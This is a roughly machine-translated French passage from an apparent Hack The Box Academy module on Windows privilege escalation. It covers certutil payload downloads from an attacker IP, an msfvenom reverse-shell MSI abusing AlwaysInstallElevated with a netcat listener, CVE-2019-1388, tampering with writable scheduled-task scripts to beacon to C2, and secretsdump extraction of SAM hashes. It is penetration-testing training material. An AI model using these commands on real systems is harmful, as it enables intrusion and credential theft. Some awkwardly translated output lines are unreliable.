Techniques Diverses
========================

* * * * *

Binaires et scripts vivants de la terre (LOLBAS)
-------------------------------------------------

Le [projet LOLBAS](https://lolbas-project.github.io/) documente les fichiers binaires, les scripts et les bibliothèques qui peuvent être utilisés pour les techniques de "vivre de la terre" sur les systèmes Windows. Chacun de ces fichiers binaires, scripts et bibliothèques est un fichier signé Microsoft qui est soit natif du système d'exploitation, soit peut être téléchargé directement depuis Microsoft et possède des fonctionnalités inattendues utiles à un attaquant. Certaines fonctionnalités intéressantes peuvent inclure :

| | | |
| --- | --- | --- |
| Exécution de code | Compilation de code | Transferts de fichiers |
| Persistance | Contournement UAC | Vol d'identifiants |
| Mémoire de processus de vidage | Enregistrement de frappe | Évasion |
| Piratage de DLL | | |

#### Transfert de fichier avec Certutil

Un exemple classique est [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), dont l'utilisation prévue est pour gérer les certificats mais peut également être utilisé pour transférer des fichiers en téléchargeant un fichier sur disque ou encodage/décodage base64 d'un fichier.

Transfert de fichier avec Certutil

```
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

```

#### Fichier d'encodage avec Certutil

Nous pouvons utiliser l'indicateur `-encode` pour encoder un fichier à l'aide de base64 sur notre hôte d'attaque Windows et copier le contenu dans un nouveau fichier sur le système distant.

Fichier d'encodage avec Certutil

```
C:\htb> certutil -encode file1 fichier encodé

Longueur d'entrée = 7
Longueur de sortie = 70
CertUtil : la commande -encode s'est terminée avec succès

```

#### Fichier de décodage avec Certutil

Une fois le nouveau fichier créé, nous pouvons utiliser l'indicateur `-decode` pour décoder le fichier dans son contenu d'origine.

Décodage de fichier avec Certutil

```
C:\htb> certutil -decode fichier encodé file2

Longueur d'entrée = 70
Longueur de sortie = 7
CertUtil : la commande -decode s'est terminée avec succès.

```

Un binaire tel que [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) peut être utilisé pour exécuter un fichier DLL. Nous pourrions l'utiliser pour obtenir un reverse shell en exécutant un fichier .DLL que nous téléchargeons sur l'hôte distant ou que nous hébergeons nous-mêmes sur un partage SMB.

Cela vaut la peine de revoir ce projet et de se familiariser avec autant de fichiers binaires, de scripts et de bibliothèques que possible. Ils pourraient s'avérer très utiles lors d'une évaluation évasive, ou d'une évaluation dans laquelle le client nous limite à une seule instance de poste de travail/serveur Windows gérée à partir de laquelle tester.

* * * * *

Toujours installer en hauteur
------------------------

Ce paramètre peut être défini via la stratégie de groupe locale en définissant `Toujours installer avec des privilèges élevés` sur `Activé` sous les chemins suivants.

- `Configuration ordinateur\Modèles d'administration\Composants Windows\Windows Installer`

- `Configuration utilisateur\Modèles d'administration\Composants Windows\Windows Installer`

![image](https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png)

#### Énumération Toujours installer les paramètres élevés

Énumérons ce paramètre.

Énumération de toujours installer les paramètres élevés

```
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
     AlwaysInstallElevated REG_DWORD 0x1

```

Énumération de toujours installer les paramètres élevés

```
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
     AlwaysInstallElevated REG_DWORD 0x1

```

Notre énumération nous montre que la clé `AlwaysInstallElevated` existe, donc la stratégie est bien activée sur le système cible.

#### Génération du package MSI

Nous pouvons exploiter cela en générant un package `MSI` malveillant et en l'exécutant via la ligne de commande pour obtenir un reverse shell avec les privilèges SYSTEM.

Génération du package MSI

```
dsgsec@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x86 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 324 octets
Taille finale du fichier msi : 159744 octets

```

#### Exécution du package MSI

Nous pouvons télécharger ce fichier MSI sur notre cible, démarrer un écouteur Netcat et exécuter le fichier à partir de la ligne de commande comme suit :

Exécution du package MSI

```
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

```

#### Attraper la coquille

Si tout se passe comme prévu, nous recevrons une connexion en tant que `NT AUTHORITY\SYSTEM`.

Attraper la coquille

```
dsgsec@htb[/htb]$ nc -lnvp 9443

écoute sur [tout] 9443 ...
se connecter à [10.10.14.3] depuis (INCONNU) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]
(c) Microsoft Corporation 2019. Tous les droits sont réservés.

C:\Windows\system32>whoami

qui suis je
autorité nt\système

```

Ce problème peut être atténué en désactivant les deux paramètres de stratégie de groupe locale mentionnés ci-dessus.

* * * * *

CVE-2019-1388
-------------

[CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) était une vulnérabilité d'élévation des privilèges dans la boîte de dialogue de certificat Windows, qui n'appliquait pas correctement les privilèges des utilisateurs. Le problème était dans le mécanisme UAC, qui présentait une option pour afficher des informations sur le certificat d'un exécutable, ouvrant la boîte de dialogue de certificat Windows lorsqu'un utilisateur clique sur le lien. Le champ `Émis par` dans l'onglet Général est affiché sous la forme d'un lien hypertexte si le fichier binaire est signé avec un certificat dont l'identificateur d'objet (OID) `1.3.6.1.4.1.311.2.1.10`. Cette valeur OID est identifiée dans l'en-tête [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) comme [SPC_SP_AGENCY_INFO_OBJID](https://docs.microsoft. com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) qui correspond au champ `SpcSpAgencyInfo` dans l'onglet des détails de la boîte de dialogue du certificat. S'il est présent, un lien hypertexte inclus dans le champ s'affichera dans l'onglet Général. Cette vulnérabilité peut être facilement exploitée à l'aide d'un ancien exécutable signé par Microsoft ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) qui contient un certificat avec le champ `SpcSpAgencyInfo` rempli avec un lien hypertexte.

Lorsque nous cliquons sur le lien hypertexte, une fenêtre de navigateur s'ouvre sous le nom `NT AUTHORITY\SYSTEM`. Une fois le navigateur ouvert, il est possible de "sortir" de celui-ci en utilisant l'option de menu `Afficher la source de la page` pour lancer une console `cmd.exe` ou `PowerShell.exe` en tant que SYSTÈME.

Passons en revue la vulnérabilité dans la pratique.

Faites d'abord un clic droit sur l'exécutable `hhupd.exe` et sélectionnez `Exécuter en tant qu'administrateur` dans le menu.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd.png)

Ensuite, cliquez sur `Afficher les informations sur le certificat de l'éditeur` pour ouvrir la boîte de dialogue du certificat. Ici, nous pouvons voir que le champ `SpcSpAgencyInfo` est renseigné dans l'onglet Détails.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd_details.png)

Ensuite, nous revenons à l'onglet Général et constatons que le champ `Émis par` est rempli avec un lien hypertexte. Cliquez dessus, puis cliquez sur `OK`, et la boîte de dialogue du certificat se fermera et une fenêtre de navigateur s'ouvrira.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png)

Si nous ouvrons `Task Manager`, nous verrons que l'instance du navigateur a été lancée en tant que SYSTEM.

![image](https://academy.hackthebox.com/storage/modules/67/chrome_system.png)

Ensuite, nous pouvons cliquer avec le bouton droit n'importe où sur la page Web et choisir "Afficher la source de la page". Une fois la source de la page ouverte dans un autre onglet, cliquez à nouveau avec le bouton droit de la souris et sélectionnez `Enregistrer sous`, et une boîte de dialogue `Enregistrer sous` s'ouvrira.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd_saveas.png)

À ce stade, nous pouvons lancer n'importe quel programme que nous voudrions en tant que SYSTEM. Tapez `c:\windows\system32\cmd.exe` dans le chemin du fichier et appuyez sur Entrée. Si tout se passe comme prévu, nous aurons une instance cmd.exe exécutée en tant que SYSTEM.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd_cmd.png)

Microsoft a publié un [correctif](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) pour ce problème en novembre 2019. Pourtant, de nombreuses organisations prennent du retard dans l'application des correctifs , nous devons toujours rechercher cette vulnérabilité si nous obtenons un accès GUI à un système potentiellement vulnérable en tant qu'utilisateur à faibles privilèges.

Ce [link](https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a) répertorie toutes les versions vulnérables de Windows Server et Workstation.

Remarque : Les étapes ci-dessus ont été effectuées à l'aide du navigateur Chrome et peuvent différer légèrement dans d'autres navigateurs.

* * * * *

Tâches planifiées
---------------

#### Énumération des tâches planifiées

Nous pouvons utiliser la commande [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) pour énumérer les tâches planifiées sur le système.

Énumération des tâches planifiées

```
C:\htb> schtasks /query /fo LIST /v

Dossier:\
INFO : Aucune tâche planifiée n'est actuellement disponible à votre niveau d'accès.

Dossier : \Microsoft
INFO : Aucune tâche planifiée n'est actuellement disponible à votre niveau d'accès.

Dossier : \Microsoft\Windows
INFO : Aucune tâche planifiée n'est actuellement disponible à votre niveau d'accès.

Dossier : \Microsoft\Windows\.NET Framework
Nom d'hôte : WINLPE-SRV01
Nom de la tâche : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Prochaine exécution : N/A
Statut : Prêt
Mode de connexion : Interactif/Arrière-plan
Dernière exécution : 27/05/2021 12:23:27
Dernier résultat : 0
Auteur : N/A
Tâche à exécuter : gestionnaire COM
Début : N/A
Commentaire : N/A
État de la tâche planifiée : Activé
Temps d'inactivité : désactivé
Gestion de l'alimentation : mode arrêt sur batterie, pas de démarrage sur batterie
Courez comme vousser : SYSTÈME
Supprimer la tâche si elle n'est pas replanifiée : désactivé
Arrêter la tâche si s'exécute X heures et X minutes : 02:00:00
Planification : les données de planification ne sont pas disponibles dans ce format.
Type d'horaire : Sur demande seulement
Heure de début : N/A
Date de début : N/A
Date de fin : N/A
Jours : N/A
Mois : N/A
Répéter : Toutes les : N/A
Répéter : Jusqu'à : Heure : N/A
Répéter : Jusqu'à : Durée : N/A
Répéter : Arrêter si toujours en cours d'exécution : N/A

<SNIP>

```

#### Énumération des tâches planifiées avec PowerShell

Nous pouvons également énumérer les tâches planifiées à l'aide de l'applet de commande [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps) PowerShell.

Énumération des tâches planifiées avec PowerShell

```
PS C:\htb> Get-ScheduledTask | sélectionnez le nom de la tâche, l'état

État du nom de la tâche
-------- -----
.NET Framework NGEN v4.0.30319 Prêt
.NET Framework NGEN v4.0.30319 64 Prêt
.NET Framework NGEN v4.0.30319 64 Critique Désactivé
.NET Framework NGEN v4.0.30319 Critique Désactivé
Gestion des modèles de stratégie de droits AD RMS (automatisée) désactivée
Gestion des modèles de stratégie de droits AD RMS (manuel) Prêt
PolicyConverter désactivé
SmartScreenSpecific Ready
VerifiedPublisherCertStoreCheck désactivé
Prêt pour l'évaluateur de compatibilité Microsoft
Prêt pour ProgramDataUpdater
StartupAppTask prêt
appuriverifierdaily Ready
appuriverifierinstall Prêt
CleanupTemporaryState Prêt
DsSvcCleanup prêt
Nettoyage d'application pré-organisé Désactivé

<SNIP>

```

Par défaut, nous ne pouvons voir que les tâches créées par notre utilisateur et les tâches planifiées par défaut de chaque système d'exploitation Windows. Malheureusement, nous ne pouvons pas répertorier les tâches planifiées créées par d'autres utilisateurs (tels que les administrateurs), car elles sont stockées dans `C:\Windows\System32\Tasks`, auxquelles les utilisateurs standard n'ont pas accès en lecture. Il n'est pas rare que les administrateurs système vont à l'encontre des pratiques de sécurité et effectuent des actions telles que fournir un accès en lecture ou en écriture à un dossier généralement réservé aux administrateurs. Nous pouvons (bien que rarement) rencontrer une tâche planifiée qui s'exécute en tant qu'administrateur configuré avec des autorisations de fichier/dossier faibles pour un certain nombre de raisons. Dans ce cas, nous pourrons peut-être modifier la tâche elle-même pour effectuer une action involontaire ou modifier un script exécuté par la tâche planifiée.

#### Vérification des autorisations sur le répertoire C:\Scripts

Considérez un scénario où nous en sommes au quatrième jour d'un engagement de test d'intrusion de deux semaines. Nous avons eu accès à une poignée de systèmes jusqu'à présent en tant qu'utilisateurs non privilégiés et avons épuisé toutes les options d'élévation de privilèges. Juste à ce moment, nous remarquons un répertoire inscriptible `C:\Scripts` que nous avons négligé dans notre énumération initiale.

Vérification des autorisations sur le répertoire C:\Scripts

```
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts

Accesschk v6.13 - Signale les autorisations effectives pour les objets sécurisables
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Scripts
   RW INTÉGRÉ\Utilisateurs
   RW NT AUTORITY\SYSTEM
   RW BUILTIN\Administrateurs

```

Nous remarquons divers scripts dans ce répertoire, tels que `db-backup.ps1`, `mailbox-backup.ps1`, etc., qui sont également tous accessibles en écriture par le groupe `BUILTIN\USERS` . À ce stade, nous pouvons ajouter un extrait de code à l'un de ces fichiers en supposant qu'au moins l'un d'entre eux s'exécute quotidiennement, voire plus fréquemment. Nous écrivons une commande pour renvoyer une balise à notre infrastructure C2 et poursuivons les tests. Le lendemain matin, lorsque nous nous connectons, nous remarquons une seule balise en tant que `NT AUTHORITY\SYSTEM` sur l'hôte DB01. Nous pouvons maintenant supposer en toute sécurité que l'un des scripts de sauvegarde s'est exécuté pendant la nuit et a exécuté notre code ajouté dans le processus. C'est un exemple de l'importance que la moindre information que nous découvrons pendant le recensement peut être importante pour le succès de notre engagement. L'énumération et la post-exploitation au cours d'une évaluation sont des processus itératifs. Chaque fois que nous effectuons la même tâche sur différents systèmes, nous pouvons gagner plus de pièces du puzzle qui, une fois assemblées, nous permettront d'atteindre notre objectif.

* * * * *

Champ de description de l'utilisateur/de l'ordinateur
-------------------------------

#### Vérification du champ de description de l'utilisateur local

Bien que cela soit plus courant dans Active Directory, il est possible pour un administrateur système de stocker les détails d'un compte (comme un mot de passe) sur un ordinateur ou sur le compte d'un utilisateur.champ de description du compte. Nous pouvons énumérer cela rapidement pour les utilisateurs locaux à l'aide de [Get-LocalUser](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) applet de commande.

Vérification du champ de description de l'utilisateur local

```
PS C:\htb> Get-LocalUser

Nom Activé Description
---- ------- -----------
Administrateur Vrai Compte intégré pour l'administration de l'ordinateur/du domaine
DefaultAccount False Un compte d'utilisateur géré par le système.
Invité Faux Compte intégré pour l'accès invité à l'ordinateur/au domaine
service d'assistance Vrai
htb-étudiant Vrai
htb-student_adm Vrai
Jordanie Vrai
enregistreur Vrai
sarah vrai
sccm_svc Vrai
scanner secsvc True Network - ne pas changer le mot de passe
sql_dev Vrai

```

#### Énumération du champ Description de l'ordinateur avec l'applet de commande Get-WmiObject

Nous pouvons également énumérer le champ de description de l'ordinateur via PowerShell à l'aide de [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell- 5.1) applet de commande avec la classe [Win32_OperatingSystem](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem).

Énumération du champ Description de l'ordinateur avec l'applet de commande Get-WmiObject

```
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | sélectionnez Descriptif

Description
-----------
La boîte la plus vulnérable de tous les temps !

```

* * * * *

Monter VHDX/VMDK
---------------

Au cours de notre énumération, nous rencontrerons souvent des fichiers intéressants à la fois localement et sur des lecteurs de partage réseau. Nous pouvons trouver des mots de passe, des clés SSH ou d'autres données qui peuvent être utilisées pour approfondir notre accès. L'outil [Snaffler](https://github.com/SnaffCon/Snaffler) peut nous aider à effectuer une énumération approfondie que nous ne pourrions pas effectuer autrement à la main. L'outil recherche de nombreux types de fichiers intéressants, tels que les fichiers contenant l'expression "pass" dans le nom du fichier, les fichiers de base de données KeePass, les clés SSH, les fichiers web.config et bien d'autres.

Trois types de fichiers spécifiques intéressants sont les fichiers `.vhd`, `.vhdx` et `.vmdk` . Il s'agit du `disque dur virtuel`, du `disque dur virtuel v2` (tous deux utilisés par Hyper-V) et du `disque de machine virtuelle` (utilisé par VMware). Supposons que nous atterrissons sur un serveur Web et que nous n'avons pas eu de chance d'augmenter les privilèges, nous recourons donc à la chasse aux partages réseau. Nous rencontrons un partage de sauvegardes hébergeant une variété de fichiers `.VMDK` et `.VHDX` dont les noms de fichiers correspondent aux noms d'hôte sur le réseau. L'un de ces fichiers correspond à un hôte sur lequel nous n'avons pas réussi à augmenter les privilèges, mais il est essentiel à notre évaluation car il existe une session d'administration Active Domain. Si nous pouvons passer à SYSTEM, nous pouvons probablement voler le hachage du mot de passe NTLM ou le ticket Kerberos TGT de l'utilisateur et prendre le contrôle du domaine.

Si nous rencontrons l'un de ces trois fichiers, nous avons la possibilité de les monter sur nos boîtiers d'attaque Linux ou Windows locaux. Si nous pouvons monter un partage à partir de notre boîte d'attaque Linux ou copier l'un de ces fichiers, nous pouvons les monter et explorer les différents fichiers et dossiers du système d'exploitation comme si nous y étions connectés à l'aide des commandes suivantes.

#### Monter VMDK sur Linux

Monter VMDK sur Linux

```
dsgsec@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

```

#### Monter VHD/VHDX sur Linux

Monter VHD/VHDX sur Linux

```
dsgsec@htb[/htb]$ guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1

```

Sous Windows, nous pouvons cliquer avec le bouton droit sur le fichier et choisir `Monter`, ou utiliser l'utilitaire `Gestion des disques` pour monter un fichier `.vhd` ou `.vhdx` . Si vous préférez, nous pouvons utiliser l'applet de commande PowerShell [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps). Quelle que soit la méthode, une fois que nous aurons fait cela, le disque dur virtuel apparaîtra comme un lecteur alphabétique que nous pourrons ensuite parcourir.

![image](https://academy.hackthebox.com/storage/modules/67/mount.png)

Pour un fichier `.vmdk` , nous pouvons cliquer avec le bouton droit de la souris et choisir `Map Virtual Disk` dans le menu. Ensuite, nous serons invités à sélectionner une lettre de lecteur. Si tout se passe comme prévu, nous pouvons parcourir les fichiers et répertoires du système d'exploitation cible. Si cela échoue, nous pouvons utiliser VMWare Workstation `File --> Map Virtual Disks` pour mapper le disque sur notre système de base. Nous pourrions également ajouter le fichier `.vmdk` sur notre machine virtuelle d'attaque en tant que disque dur virtuel supplémentaire, puis y accéder en tant que lecteur alphabétique. Nous pouvons même utiliser `7-Zip` pour extraire des données d'un fichier .`vmdk` . Ce [guide](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) illustre de nombreuses méthodes pour accéder aux fichiers d'un fichier `.vmdk` .

#### Récupération des hachages à l'aide de Secretsdump.py

Pourquoi nous soucions-nous d'un disque dur virtuel (en particulier Windows) ? Si nous pouvons localiser une sauvegarde d'une machine active, nous pouvons accéder au répertoire `C:\Windows\System32\Config` et dérouler les ruches de registre `SAM`, `SECURITY` et `SYSTEM`. Nous pouvons ensuite utiliser un outil tel que [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) pour extraire le mot de passeord hachages pour les utilisateurs locaux.

Récupération de hachages à l'aide de Secretsdump.py

```
dsgsec@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[*] Clé de démarrage du système cible : 0x35fb33959c691334c2e4297207eeeeba
[*] Vidage des hachages SAM locaux (uid:rid:lmhash:nthash)
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 :::
Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 :::
Compte par défaut : 503 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 :: :
[*] Vidage des informations de connexion au domaine mises en cache (domaine/nom d'utilisateur : hachage)

<SNIP>

```

Nous pouvons avoir de la chance et récupérer le hachage du mot de passe de l'administrateur local pour le système cible ou trouver un ancien hachage du mot de passe de l'administrateur local qui fonctionne sur d'autres systèmes de l'environnement (ce que j'ai fait sur plusieurs évaluations).